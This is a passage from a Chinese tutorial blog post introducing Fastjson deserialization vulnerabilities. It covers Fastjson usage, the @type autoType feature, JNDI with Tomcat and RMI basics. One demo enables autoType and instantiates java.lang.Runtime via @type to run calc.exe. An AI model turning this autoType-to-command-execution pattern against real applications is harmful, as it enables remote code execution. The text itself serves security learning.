# 零、前言与目录  
　　我在学习`Java`漏洞的时候，感觉很痛苦，不知道从何学起，因为我的`Java`基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问`chatgpt`以及问`Java`安全大牛师傅们，于是就有了这一系列的文章。  
　　本文作为`Java`安全亲妈级零基础教程的第一篇`Fastjson`漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文除去代码一共近`11000`字，配图`108`张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究`Fastjson`的其他`payload`和`Fastjson`的不出网利用上，会在下一次更新。  
　　我在学习`Fastjson`相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不觉。在写这系列的文章的时候，我常常能进入到久违的”心流“状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！  
　　在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。  
　　本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！  
# 一、前置知识
## 1. fastjson怎么用？
`fastjson`是啥百度就有，看了之后不熟悉的人还是会一脸懵逼，我们可以通过以下这个小例子来快速学会使用`fastjson`。我们分为以下几个步骤来进行：
### （1）在IDEA中新建一个maven项目，并引入fastjson依赖
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810150808-505a54f9-7b81-4e4f-9633-fd72986c7a23.png#averageHue=%233f4956&clientId=u5a3e9323-ecb0-4&from=paste&height=134&id=uae782e2e&name=image.png&originHeight=167&originWidth=715&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17956&status=done&style=none&taskId=ud8efe4aa-6e39-4404-8036-eae240fa0f3&title=&width=572)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810171469-292f969d-495e-41a9-b3a0-4ac11ff8b11f.png#averageHue=%233d4144&clientId=u5a3e9323-ecb0-4&from=paste&height=616&id=ud692157b&name=image.png&originHeight=770&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60694&status=done&style=none&taskId=ucd608cff-9d5f-44fc-b9b8-b0f63eb6458&title=&width=800)
选择`Maven`，然后给随便取个名字，例如我起名`fastjson_research`。
然后在pom.xml这里的末尾，添加如下内容：
```java
<dependencies>
    <dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.50</version>
    </dependency>
</dependencies>
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810256002-2cb3c874-f77d-44a9-b839-b16988e377d2.png#averageHue=%237b7752&clientId=u5a3e9323-ecb0-4&from=paste&height=674&id=u151de80a&name=image.png&originHeight=843&originWidth=1727&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140235&status=done&style=none&taskId=u3b3be4c0-bfcc-4c3c-a25d-a10a46cfc22&title=&width=1381.6)
具体`Maven`的各个依赖的详细信息我们可以在这个网站上面查得到：
```
https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.50
```
然后点击右侧的`Maven`，然后点击`Reload All Maven Projects`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810581918-9de49706-1559-4e51-9215-eb23ef031648.png#averageHue=%2353705c&clientId=u5a3e9323-ecb0-4&from=paste&height=815&id=u0144c4c9&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156019&status=done&style=none&taskId=u98e35746-75e0-4867-b5fb-47a0cea9080&title=&width=1536)
### （2）一个简单的demo
```java
package org.example;
import com.alibaba.fastjson.JSON;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"age\":20,\"name\":\"Bob\"}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    public static class Person {
        private String name;
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public int getAge() {
            return age;
        }
    }
}
```
运行之后输出结果如下：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678850073066-4c9b9608-3eba-47d8-acdf-10d415adb5ff.png#averageHue=%23706d58&clientId=u5a3e9323-ecb0-4&from=paste&height=771&id=u744eef74&name=image.png&originHeight=964&originWidth=1406&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=138066&status=done&style=none&taskId=u47b99af9-a647-40f2-a2cd-181095a4ff2&title=&width=1124.8)
通过以上代码我们可以看到，我们定义了一个`Person`类，并设置了两个属性`age`以及`name`，以及简单定义了四个方法。
我们通过`Person person = new Person("Alice", 18);`来初始化对象，再通过`String jsonString = JSON.toJSONString(person);`去把对象转化为`json`字符串，非常方便快捷；完事之后，我们又可以通过`Person person2 = JSON.parseObject(jsonString2, Person.class);`把`json`字符串转换为`Java`对象，非常简单快捷。
### （3）更进一步改动理解上述demo代码
其实上面给出的代码是有一些问题的，这个问题并不是指代码本身错误。
#### ①问题1：`Person person2 = JSON.parseObject(jsonString2, Person.class);`这里为什么可以直接使用`Person.class`来进行映射？
在使用`fastjson`时，我们需要先将`JSON`字符串和`Java`对象之间建立映射关系，可以通过类的属性和`JSON`字段名进行映射。在我们上面的代码中，`Java`类的属性名和`JSON`字段名是相同的，因此可以直接使用`Person.class`来进行映射。
**如果不同我们该怎么办？**
我们可以通过使用注解来指定它们之间的映射关系。在`fastjson`中，可以使用`@JSONField`注解来指定`Java`类的属性和`JSON`字段之间的映射关系。请看以下`demo`代码：
```java
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONField;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"user_name\":\"Bob\",\"user_age\":20}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    public static class Person {
        @JSONField(name = "user_name")
        private String name;
        @JSONField(name = "user_age")
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getAge() {
            return age;
        }

        public void setAge(int age) {
            this.age = age;
        }
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678850867581-374608ce-3e06-4a4e-a605-07877bc810af.png#averageHue=%23757258&clientId=u5a3e9323-ecb0-4&from=paste&height=818&id=ua4f98178&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=183193&status=done&style=none&taskId=u146cb755-819c-468f-b3d3-20025bb1e31&title=&width=1536)
可以看到，我们在定义`name`和`age`的时候，在上面分别加入了一行`@JSONField(name = "user_name")`和`@JSONField(name = "user_age")`，这样一来，即使我们输入的字符串中写的是`user_name`和`user_age`，它也能被识别解析到。
#### ②问题2：为什么我初始化对象的时候，代码明明写的是`Person person = new Person("Alice", 18);`，`name`在前，`age`在后，怎么转化成`json`字符串的时候就变成了`age`在前，`name`在后了？
原来，在`fastjson`中，默认情况下，生成的`JSON`字符串的顺序是按照**属性的字母顺序**进行排序的，而不是按照属性在类中的声明顺序。
如果我们希望按照属性在类中的声明顺序来生成`JSON`字符串，可以通过在类中使用`@JSONType`注解来设置属性的序列化顺序，请看下面的代码：
```java
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONType;

public class Main {

    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"name\":\"Bob\",\"age\":20}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    @JSONType(orders = {"name", "age"})
    public static class Person {
        private String name;
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getAge() {
            return age;
        }

        public void setAge(int age) {
            this.age = age;
        }
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678851311173-7f2e6fbb-561f-4c31-8208-739a2a71ff7a.png#averageHue=%23767259&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=u6e9a585a&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=182305&status=done&style=none&taskId=u02c4f8e8-800e-47cc-897e-86d2462328c&title=&width=1536)
我们通过`@JSONType(orders = {"name", "age"})`来指定属性的序列化顺序，这样就是`name`在前，`age`在后了。
## 2. @type是什么东西？如何反序列化带@type的json字符串？
> 参考：[https://www.cnblogs.com/nice0e3/p/14601670.html](https://www.cnblogs.com/nice0e3/p/14601670.html)

我们在网上看到了很多讲`fastjson`反序列化漏洞的文章，里面都提到了`@type`，那么它到底是什么呢？
`@type`是`fastjson`中的一个特殊注解，用于标识`JSON`字符串中的某个属性是一个`Java`对象的类型。具体来说，当`fastjson`从`JSON`字符串反序列化为`Java`对象时，如果`JSON`字符串中包含`@type`属性，`fastjson`会根据该属性的值来确定反序列化后的`Java`对象的类型。请看以下代码：
```java
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        String json = "{\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\"}";
        ParserConfig.getGlobalInstance().addAccept("java.lang");
        Runtime runtime = (Runtime) JSON.parseObject(json, Object.class);
        runtime.exec("calc.exe");
    }
}
```
可以看到直接弹窗了：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678869601540-2685c1d7-35f6-45f0-91eb-2ea1e5d42845.png#averageHue=%23807f5c&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=ubbdc38c5&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=202604&status=done&style=none&taskId=uaf5b0ade-bd8a-401d-aeff-cb67221e624&title=&width=1536)
由于`fastjson`在`1.2.24`之后默认禁用@type，因此这里我们通过`ParserConfig.getGlobalInstance().addAccept("java.lang");`来开启，否则会报错`autoType is not support`。
我们再看这样的一个`demo`：
首先是类的定义，例如我们的`Person.java`：
```java
package org.example;

public class Person {
    private String name;
    private int age;

    public Person() {}

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```
然后是`Main.java`：
```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Main {
    public static void main(String[] args) {
        Person user = new Person();
        user.setAge(18);
        user.setName("xiaoming");
        String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s1);
    }
}
```
输出结果为：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1680531069142-af92a844-9476-4eda-8546-f7980d14f043.png#averageHue=%23f9f8f7&clientId=u8272b843-0f56-4&from=paste&height=816&id=ucb05a2cf&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=155901&status=done&style=none&taskId=u56178bd4-dd62-460c-b947-a440ab336f4&title=&width=1536)
在和前面代码做对比后，可以发现其实就是在调用`toJSONString`方法的时候，参数里面多了一个`SerializerFeature.WriteClassName`方法。传入`SerializerFeature.WriteClassName`可以使得`Fastjson`支持自省，开启自省后序列化成`JSON`的数据就会多一个`@type`，这个是代表对象类型的`JSON`文本。`FastJson`的漏洞就是他的这一个功能去产生的，在对该`JSON`数据进行反序列化的时候，会去调用指定类中对于的`get/set/is`方法， 后面会详细分析。
然后我们就可以通过以下三种方式来反序列化`json`字符串了：
```java
// 方法一（返回JSONObject对象）：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
JSONObject jsonObject = JSON.parse(s1);
System.out.println(jsonObject);

// 方法二：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s = JSON.toJSONString(user);
Person user1 = JSON.parseObject(s, Person.class);
System.out.println(user1);

// 方法三：
Person user = new Person();
user.setAge(18);
user.setName("xiaoming");
String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
Person user1 = JSON.parseObject(s1,Person.class);
System.out.println(user1);
```
执行结果都是一样的：
```java
Person{name='xiaoming', age=18}
```

## 3. JNDI是什么东西？
`JNDI`是`Java`平台的一种`API`，它提供了访问各种命名和目录服务的统一方式。`JNDI`通常用于在`JavaEE`应用程序中查找和访问资源，如`JDBC`数据源、`JMS`连接工厂和队列等。
光这么说还是太抽象了，直接上例子。如果我们想要搭建一个`jndi`的环境，我们需要这么做：
首先需要说明的是我`Java`版本是`17`，如果不是的话需要安装配置，不然后面的可能会报错，百度谷歌都没用的那种。
### （1）整一个tomcat容器，并在容器中配置数据源
打开`[https://tomcat.apache.org/](https://tomcat.apache.org/)`，然后点击`Download`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871742488-2dd6261d-7a5a-424f-bd7c-7736a66e24f7.png#averageHue=%23f6f3ef&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=u4a2029d6&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=284463&status=done&style=none&taskId=ua9a3150e-eeab-44fb-aec6-7e1d7b40a5e&title=&width=1489.6)
这里直接选择下载`64`位`Windows`的压缩包：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871777883-2d3041ee-6687-40e3-a588-9a2f9020627e.png#averageHue=%23f9f8f6&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=udccaff86&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=168055&status=done&style=none&taskId=ue2c3e7cf-d5b2-4e67-ad6b-4d832a05ced&title=&width=1489.6)
下载链接：[https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip](https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip)
解压之后，可以给改一个简洁一点的名字，例如`tomcat`，然后把`bin`目录放到环境变量中，如下图：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678871909392-a153df8e-e003-4b44-93dd-0369206511f6.png#averageHue=%23c3fffe&clientId=u5a3e9323-ecb0-4&from=paste&height=23&id=ud30af5fe&name=image.png&originHeight=29&originWidth=153&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1185&status=done&style=none&taskId=ub5e3125f-4b16-4f27-8dc6-d65ec8071f1&title=&width=122.4)
然后再新建一个名为`CATALINA_HOME`的路径，值为`tomcat`的根目录，例如我的：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678872011706-5df6e795-dfb8-437c-9863-bf7d5cb0302a.png#averageHue=%23ededec&clientId=u5a3e9323-ecb0-4&from=paste&height=180&id=u4d821b9d&name=image.png&originHeight=225&originWidth=855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15765&status=done&style=none&taskId=u5eecb1bb-124b-4e18-9f96-4390a3d9f89&title=&width=684)
除此之外，没有配置`JAVA_HOME`和`JRE_HOME`的也要在用户变量中配置一下，需要注意的是，我这里貌似需要安装并配置`Java17`，否则一直闪退无法启动：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678875849493-91d36457-7833-42d0-b633-649a62e45492.png#averageHue=%23efeeec&clientId=u5a3e9323-ecb0-4&from=paste&height=575&id=u698825ed&name=image.png&originHeight=719&originWidth=789&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57359&status=done&style=none&taskId=ud6b3239b-7739-47ac-87c8-b0263557477&title=&width=631.2)
双击`tomcat`的`bin`目录下的`startup.bat`，然后访问`[http://localhost:8080/](http://localhost:8080/)`，就可以看到服务启动成功了：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678875916985-26a9e911-1d15-4486-9080-4a6b5c4ef766.png#averageHue=%23f9e8bc&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=u66a0d2d1&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=203547&status=done&style=none&taskId=ubf23ed7a-90f5-4573-a30d-881aceb0073&title=&width=1489.6)
然后配置`tomcat`目录下的`context.xml`（`tomcat7`及以前则是配置`server.xml`）：
```xml
	<Resource name="jdbc/security" auth="Container" type="javax.sql.DataSource"
             maxTotal="100" maxIdle="30" maxWaitMillis="10000"
             username="root" password="123456" driverClassName="com.mysql.jdbc.Driver"
             url="jdbc:mysql://localhost:3306/security"/>
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884813124-e4662dda-0305-4f74-953d-751043043578.png#averageHue=%23faf8f6&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=u4b4568db&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147663&status=done&style=none&taskId=uf6cb4639-0c7a-4a26-81aa-708db810e85&title=&width=1536)
可以根据自己本地开启的`mysql`的实际情况来改，我这里是使用`phpstudy`来安装开启`mysql`的：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678878030641-e131c110-2cbf-40eb-83bd-5a9cbc7f82d1.png#averageHue=%23f6664d&clientId=u5a3e9323-ecb0-4&from=paste&height=630&id=u07a00bb8&name=image.png&originHeight=787&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62447&status=done&style=none&taskId=u4d631b99-0f87-4b27-9fbe-30e87e4318d&title=&width=800)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884839404-7bbfe528-6b66-4a09-a39f-3fba71541850.png#averageHue=%23f2f0f0&clientId=u5a3e9323-ecb0-4&from=paste&height=714&id=uf47bd28b&name=image.png&originHeight=892&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=189602&status=done&style=none&taskId=u0a385556-b6a2-4666-a56d-af35292aecc&title=&width=1489.6)
然后继续配置`tomcat`的`conf`目录下的`web.xml`：
```xml
<resource-ref>
    <description>Test DB Connection</description>
    <res-ref-name>jdbc/root</res-ref-name>
    <res-type>javax.sql.DataSource</res-type>
    <res-auth>Container</res-auth>
</resource-ref>
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884890340-20382807-f27e-4944-93ca-3c01025b0e1e.png#averageHue=%23faf8f5&clientId=u5a3e9323-ecb0-4&from=paste&height=754&id=u27b67135&name=image.png&originHeight=942&originWidth=1298&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=127673&status=done&style=none&taskId=ud45b656f-1d40-49ac-b9ea-2a923c485c7&title=&width=1038.4)
### （2）去IDEA里面配置web
首先先新建一个项目，我命名为`jndi_demo`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885151233-80553b0b-4115-4b22-81a2-2f09d7ec0bcf.png#averageHue=%233d4143&clientId=u5a3e9323-ecb0-4&from=paste&height=616&id=u97f4ba70&name=image.png&originHeight=770&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62140&status=done&style=none&taskId=u711deb09-aea9-4362-b061-78fb3799b3d&title=&width=800)
接着配置`tomcat`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885256148-bb6a70c4-2040-4dd4-bc2c-ec15f129550d.png#averageHue=%233c3f42&clientId=u5a3e9323-ecb0-4&from=paste&height=809&id=ubc2e9a3b&name=image.png&originHeight=1011&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140947&status=done&style=none&taskId=ueca69d2c-5b70-4f87-830b-d314a54c05a&title=&width=1536)
这里我选择了`8089`端口，因为我`8080`端口之前被我占用了：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885463623-4eb4fb66-6728-447d-ad91-16edd1827e79.png#averageHue=%233d4144&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ud70ab01d&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75442&status=done&style=none&taskId=ubc655a0e-e250-46a6-945a-c9d49f77248&title=&width=1057.6)
然后：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885908742-a4d7374b-8046-4656-b300-e1e7ef5f861b.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ucaad5837&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72302&status=done&style=none&taskId=u8ceaa752-695d-4f5b-b6f8-4d9a727995a&title=&width=1037.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886000311-95920e80-ed67-4209-a6ec-2d759a842e51.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u67f85316&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54705&status=done&style=none&taskId=u953ad30f-a157-489b-ba82-f410b2b6ef0&title=&width=1037.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886015112-7edcf0a1-4cdd-4f7c-aa1f-4edfd2be07d7.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u24a185b3&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69038&status=done&style=none&taskId=u7a926f43-303b-43d6-b3a6-3539868d54a&title=&width=1037.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886033023-b1dfa5ca-f257-47cf-a089-60cd0c6c8220.png#averageHue=%233d4146&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u73ae6ade&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78123&status=done&style=none&taskId=uca6ee483-3093-4d00-8171-d9096784b84&title=&width=1037.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940228400-d86c60c7-f6f6-4a1b-bf13-edc32055593e.png#averageHue=%23f4f2f2&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ubb203486&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64387&status=done&style=none&taskId=u102cee43-67c3-4d57-8c3e-66bba745d08&title=&width=1037.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940285160-03bd07bd-0cf2-4d34-a6f8-ebcc052b2335.png#averageHue=%23f4f4f4&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u6cf8711e&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59684&status=done&style=none&taskId=ue105458a-02d4-46c1-a767-d091e1a0f82&title=&width=1037.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940273192-99f3ccd4-03b0-4718-b388-f7c8ae601726.png#averageHue=%23f7f5f5&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u4765463e&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=81848&status=done&style=none&taskId=u092f6e04-3bf1-4f40-a96d-dba977918d1&title=&width=1037.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940545495-c9b4c888-fc80-43aa-95a6-62b6fa4f0c36.png#averageHue=%23f8f4f3&clientId=u5a3e9323-ecb0-4&from=paste&height=524&id=u5782aece&name=image.png&originHeight=655&originWidth=1456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96736&status=done&style=none&taskId=u9965f6de-7b0e-4968-92c5-93b04945fc6&title=&width=1164.8)
然后填写代码运行配置：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940431187-6a26c894-0981-41c3-bbea-fc04f2ba05aa.png#averageHue=%23f3f3f3&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uaa500cbd&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71631&status=done&style=none&taskId=ua8132b45-bf0e-4f29-8390-732aeb21065&title=&width=1057.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940460670-a57c6c50-a6f2-4f41-b956-1f79301227e0.png#averageHue=%23f6f6f5&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uecd3abc9&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48017&status=done&style=none&taskId=u929bdaa4-97ae-4e06-81bf-8141f26456e&title=&width=1057.6)
### （3）跑jndi的demo代码，感受jndi的用处
然后贴上如下代码：
```java
package org.example;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.sql.DataSource;
import java.io.IOException;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.Statement;

@WebServlet("/test")
public class Test extends HttpServlet {

    @Override
    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            // 获取JNDI上下文
            Context ctx = new InitialContext();

            // 查找数据源
            Context envContext = (Context) ctx.lookup("java:/comp/env");
            DataSource ds = (DataSource) envContext.lookup("jdbc/security");

            // 获取连接
            Connection conn = ds.getConnection();

            System.out.println("[+] success!");

            // 执行查询
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("select * from security.emails;");

            // 处理结果集
            while (rs.next()) {
                System.out.println(rs.getString("email_id"));
            }

            // 关闭连接
            rs.close();
            stmt.close();
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
成功跑起来了：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940374491-2a860b2a-0870-40b8-a504-0019cc5ed891.png#averageHue=%23f8f5f4&clientId=u5a3e9323-ecb0-4&from=paste&height=814&id=ua5fe7851&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=212963&status=done&style=none&taskId=u9a05a617-b988-4f85-90dd-fc1615e8cf6&title=&width=1536)
然后访问`[http://localhost:6063/test](http://localhost:6063/test)`：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940781085-073b70b4-6f21-42a4-bc56-453a330c8231.png#averageHue=%23fdfdfd&clientId=u5a3e9323-ecb0-4&from=paste&height=765&id=u653be59d&name=image.png&originHeight=956&originWidth=1318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30517&status=done&style=none&taskId=u5a626861-d6b2-478a-b562-88ede7b098e&title=&width=1054.4)
没有出现`404`，说明`WebServlet`拦截成功，回到`idea`，发现查询成功：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940740270-4c3ffea5-b5d4-4f34-af48-9f9e5ede55a9.png#averageHue=%23f7f6f4&clientId=u5a3e9323-ecb0-4&from=paste&height=813&id=ub1527115&name=image.png&originHeight=1016&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=198241&status=done&style=none&taskId=u3bc40381-6b60-4624-8688-2cf0a6660aa&title=&width=1536)
## 4. RMI是什么东西？
### （1）通过一个demo快速认识rmi是如何调用的
`RMI`指的是远程方法调用（`Remote Method Invocation`），是`Java`平台提供的一种机制，可以实现在不同`Java`虚拟机之间进行方法调用。这么说是真抽象，我们直接看下面使用了`RMI`的`demo`代码，包括一个服务器端和一个客户端。这个`demo`实现了一个简单的计算器程序，客户端通过`RMI`调用服务器端的方法进行加、减、乘、除四则运算。
首先是一个计算器接口：
```java
package org.example;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface Calculator extends Remote {
    public int add(int a, int b) throws RemoteException;

    public int subtract(int a, int b) throws RemoteException;

    public int multiply(int a, int b) throws RemoteException;

    public int divide(int a, int b) throws RemoteException;
}
```
然后是客户端代码：
```java
package org.example;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    private Client() {}

    public static void main(String[] args) {
        try {
            // Get the registry
            Registry registry = LocateRegistry.getRegistry("localhost", 1060);

            // Lookup the remote object "Calculator"
            Calculator calc = (Calculator) registry.lookup("Calculator");

            // Call the remote method
            int result = calc.add(5, 7);

            // Print the result
            System.out.println("Result: " + result);
        } catch (Exception e) {
